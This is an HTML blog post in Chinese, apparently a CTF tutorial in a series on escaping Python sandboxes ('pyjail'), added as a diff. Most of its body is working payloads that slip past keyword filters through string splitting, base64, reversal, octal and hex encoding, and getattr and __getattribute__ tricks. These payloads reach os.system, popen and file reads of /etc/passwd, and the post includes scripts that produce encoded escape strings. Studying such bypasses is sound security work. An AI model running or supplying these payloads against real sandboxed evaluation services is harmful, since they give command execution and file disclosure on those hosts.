@@ -1,0 +1,1378 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>pyjail bypass-02 绕过基于字符串匹配的过滤 - DumKiy's blog</title>
+
+<meta name="description" content="绕过基于字符串匹配的过滤字符串变换字符串拼接在我们的 payload 中，例如如下的 payload，__builtins__ file 这些字符串如果被过滤了，就可以使用字符串变换的方式进行绕过。''.__class__.__mro__[2].__subclasses__()[59].__init__.__gl...">
+<link rel="canonical" href="http://localhost:4000/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>pyjail bypass-02 绕过基于字符串匹配的过滤</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-07-01-pyjail-bypass-02-字符串变换绕过.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="pyjail bypass-02 绕过基于字符串匹配的过滤"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=pyjail">pyjail</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>May 30, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-05-30T18:23:57+08:00">
+    <meta itemprop="keywords" content="pyjail"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h2 id="绕过基于字符串匹配的过滤">绕过基于字符串匹配的过滤</h2>
+
+<h3 id="字符串变换">字符串变换</h3>
+
+<h4 id="字符串拼接">字符串拼接</h4>
+<p>在我们的 payload 中，例如如下的 payload，<code class="language-plaintext highlighter-rouge">__builtins__</code> <code class="language-plaintext highlighter-rouge">file</code> 这些字符串如果被过滤了，就可以使用字符串变换的方式进行绕过。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">file</span><span class="sh">'</span><span class="p">](</span><span class="sh">'</span><span class="s">E:/passwd</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+
+<span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">__buil</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">tins__</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">fi</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">le</span><span class="sh">'</span><span class="p">](</span><span class="sh">'</span><span class="s">E:/passwd</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+</code></pre></div></div>
+<p>当然，如果过滤的是 <code class="language-plaintext highlighter-rouge">__class__</code> 或者 <code class="language-plaintext highlighter-rouge">__mro__</code> 这样的属性名，就无法采用变形来绕过了。</p>
+
+<h4 id="base64-变形">base64 变形</h4>
+<p>base64 也可以运用到其中</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">base64</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">X19pbXBvcnRfXw==</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">b3M=</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">__builtins__</span><span class="p">.</span><span class="n">__dict__</span><span class="p">[</span><span class="sh">'</span><span class="s">X19pbXBvcnRfXw==</span><span class="sh">'</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">base64</span><span class="sh">'</span><span class="p">)](</span><span class="sh">'</span><span class="s">b3M=</span><span class="sh">'</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">base64</span><span class="sh">'</span><span class="p">)).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">calc</span><span class="sh">'</span><span class="p">)</span>
+<span class="mi">0</span>
+</code></pre></div></div>
+
+<h4 id="逆序">逆序</h4>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="s">imaohw</span><span class="sh">"</span><span class="s">(metsys.)</span><span class="sh">"</span><span class="s">so</span><span class="sh">"</span><span class="s">(__tropmi__</span><span class="sh">'</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">kali</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">exec</span><span class="p">(</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="s">imaohw</span><span class="sh">"</span><span class="s">(metsys.so ;so tropmi</span><span class="sh">'</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">kali</span>
+</code></pre></div></div>
+<p>注意 exec 与 eval 在执行上有所差异。</p>
+
+<h4 id="进制转换">进制转换</h4>
+<p>八进制：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">exec</span><span class="p">(</span><span class="sh">"</span><span class="s">print(</span><span class="sh">'</span><span class="s">RCE</span><span class="sh">'</span><span class="s">); __import__(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="s">).system(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">exec</span><span class="p">(</span><span class="sh">"</span><span class="se">\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>exp:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="sh">"</span><span class="s">eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False])</span><span class="sh">"</span>
+<span class="n">octal_string</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sa">f</span><span class="sh">"</span><span class="se">\\</span><span class="si">{</span><span class="nf">oct</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">2</span><span class="si">:</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">octal_string</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>十六进制：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">exec</span><span class="p">(</span><span class="sh">"</span><span class="se">\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>exp:</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="sh">"</span><span class="s">eval(eval(list(dict(v_a_r_s=True))[len([])][::len(list(dict(aa=()))[len([])])])(__import__(list(dict(b_i_n_a_s_c_i_i=1))[False][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b___b_a_s_e_6_4=1))[False][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=True))[False]))</span><span class="sh">"</span>
+<span class="n">octal_string</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="sa">f</span><span class="sh">"</span><span class="se">\\</span><span class="s">x</span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="nf">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">2</span><span class="si">:</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">octal_string</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="其他编码">其他编码</h4>
+<p>hex、rot13、base32 等。</p>
+
+<h3 id="过滤了属性名或者函数名">过滤了属性名或者函数名</h3>
+<p>在 payload 的构造中，我们大量的使用了各种类中的属性，例如 <code class="language-plaintext highlighter-rouge">__class__</code>、<code class="language-plaintext highlighter-rouge">__import__</code> 等。</p>
+<h4 id="getattr-函数">getattr 函数</h4>
+<p>getattr 是 Python 的内置函数，用于获取一个对象的属性或者方法。其语法如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">getattr</span><span class="p">(</span><span class="nb">object</span><span class="p">,</span> <span class="n">name</span><span class="p">[,</span> <span class="n">default</span><span class="p">])</span>
+</code></pre></div></div>
+<p>这里，object 是对象，name 是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">getattr</span><span class="p">({},</span><span class="sh">'</span><span class="s">__class__</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">dict</span><span class="sh">'</span><span class="s">&gt;
+</span><span class="gp">&gt;&gt;&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="n">system</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">cat /etc/passwd</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">zsh</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">os</span><span class="p">,</span><span class="sh">'</span><span class="s">system111</span><span class="sh">'</span><span class="p">,</span><span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">)(</span><span class="sh">'</span><span class="s">cat /etc/passwd</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">zsh</span>
+</code></pre></div></div>
+<p>这样一来，就可以将 payload 中的属性名转化为字符串，字符串的变换方式多种多样，更易于绕过黑名单。</p>
+
+<h4 id="__getattribute__-函数"><code class="language-plaintext highlighter-rouge">__getattribute__</code> 函数</h4>
+<p><code class="language-plaintext highlighter-rouge">__getattribute__</code> 于，它定义了当我们尝试获取一个对象的属性时应该进行的操作。</p>
+
+<p>它的基本语法如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">MyClass</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__getattribute__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</code></pre></div></div>
+<p>getattr 函数在调用时，实际上就是调用这个类的 <code class="language-plaintext highlighter-rouge">__getattribute__</code> 方法。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="n">__getattribute__</span>
+<span class="o">&lt;</span><span class="n">method</span><span class="o">-</span><span class="n">wrapper</span> <span class="sh">'</span><span class="s">__getattribute__</span><span class="sh">'</span> <span class="n">of</span> <span class="n">module</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7f06a9bf44f0</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">os</span><span class="p">.</span><span class="nf">__getattribute__</span><span class="p">(</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="n">system</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h4 id="__getattr__-函数"><code class="language-plaintext highlighter-rouge">__getattr__</code> 函数</h4>
+<p><code class="language-plaintext highlighter-rouge">__getattr__</code> 是 Python 的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个 <code class="language-plaintext highlighter-rouge">AttributeError</code> 异常。</p>
+
+<p>如下是 <code class="language-plaintext highlighter-rouge">__getattr__</code> 方法的基本形式：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">MyClass</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__getattr__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sh">'</span><span class="s">You tried to get </span><span class="sh">'</span> <span class="o">+</span> <span class="n">name</span>
+</code></pre></div></div>
+
+<p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p>
+
+<p>与 <code class="language-plaintext highlighter-rouge">__getattribute__</code> 不同，<code class="language-plaintext highlighter-rouge">__getattr__</code> 只有在属性查找失败时才会被调用，这使得 <code class="language-plaintext highlighter-rouge">__getattribute__</code> 可以用来更为全面地控制属性访问。</p>
+
+<p>如果在一个类中同时定义了 <code class="language-plaintext highlighter-rouge">__getattr__</code> 和 <code class="language-plaintext highlighter-rouge">__getattribute__</code>，那么无论属性是否存在，<code class="language-plaintext highlighter-rouge">__getattribute__</code> 都会被首先调用。只有当 <code class="language-plaintext highlighter-rouge">__getattribute__</code> 抛出 <code class="language-plaintext highlighter-rouge">AttributeError</code> 异常时，<code class="language-plaintext highlighter-rouge">__getattr__</code> 才会被调用。</p>
+
+<p>另外，所有的类都会有<code class="language-plaintext highlighter-rouge">__getattribute__</code>属性，而不一定有<code class="language-plaintext highlighter-rouge">__getattr__</code>属性。</p>
+
+<h4 id="__globals__-替换"><code class="language-plaintext highlighter-rouge">__globals__</code> 替换</h4>
+<p><code class="language-plaintext highlighter-rouge">__globals__</code> 可以用 func_globals 直接替换；</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span>
+<span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">func_globals</span>
+<span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="nf">__getattribute__</span><span class="p">(</span><span class="sh">"</span><span class="s">__glo</span><span class="sh">"</span><span class="o">+</span><span class="sh">"</span><span class="s">bals__</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="__mro____bases____base__互换"><code class="language-plaintext highlighter-rouge">__mro__、__bases__、__base__</code>互换</h4>
+
+<p>三者之间可以相互替换</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="p">{}.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="p">{}.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="p">{}.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
